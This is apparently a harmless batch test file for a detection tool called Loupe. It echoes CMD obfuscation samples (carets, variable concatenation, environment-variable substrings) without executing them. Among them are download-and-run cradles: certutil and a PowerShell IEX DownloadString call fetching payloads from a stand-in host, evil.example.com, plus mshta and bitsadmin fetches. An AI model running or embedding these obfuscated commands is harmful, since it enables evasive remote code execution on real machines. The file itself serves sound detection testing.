@echo off
REM === Loupe Test File: CMD Obfuscation Examples ===
REM This file contains various CMD obfuscation techniques for testing detection.
REM WARNING: This is a HARMLESS test file. No actual malicious actions are performed.

REM ── Technique 1: Caret Insertion ──
REM Carets break up keywords so AV/static scanners miss them
echo [TEST] Caret obfuscation:
echo p^o^w^e^r^s^h^e^l^l -c "Write-Host 'Hello from caret test'"
echo c^e^r^t^u^t^i^l -decode test.b64 test.exe
echo m^s^h^t^a http://example.com/test.hta
echo b^i^t^s^a^d^m^i^n /transfer testjob http://example.com/file.exe C:\temp\file.exe

REM ── Technique 2: SET Variable Concatenation ──
REM Build commands from small variable fragments
echo [TEST] SET variable concatenation:
set a=pow
set b=ers
set c=hel
set d=l
set e=-c
set f=Write
set g=-Host
set h='test'
echo %a%%b%%c%%d% %e% "%f%%g% %h%"

REM ── Technique 3: CALL with variable expansion ──
echo [TEST] CALL with concatenated variables:
set x1=po
set x2=wer
set x3=she
set x4=ll
call echo %x1%%x2%%x3%%x4%

REM ── Technique 4: Environment Variable Substring Abuse ──
REM Extract individual characters from known env vars to build commands
echo [TEST] Environment variable substring abuse:
REM %COMSPEC% is typically C:\Windows\system32\cmd.exe
REM Extract characters: %COMSPEC:~0,1% = C, etc.
echo %COMSPEC:~0,1%%COMSPEC:~1,1%%COMSPEC:~2,1%
echo %PATH:~0,1%%PATH:~1,1%%PATH:~2,1%%PATH:~3,1%%PATH:~4,1%

REM ── Technique 5: Mixed Obfuscation ──
echo [TEST] Mixed techniques:
set aa=cer
set bb=tut
set cc=il
echo %aa%%bb%%cc% -urlcache -split -f http://evil.example.com/payload.exe C:\temp\payload.exe

REM ── Technique 6: FOR loop character extraction ──
echo [TEST] FOR loop obfuscation:
set "payload=powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/script.ps1')"
echo %payload%

echo.
echo [DONE] All CMD obfuscation test patterns rendered.
pause
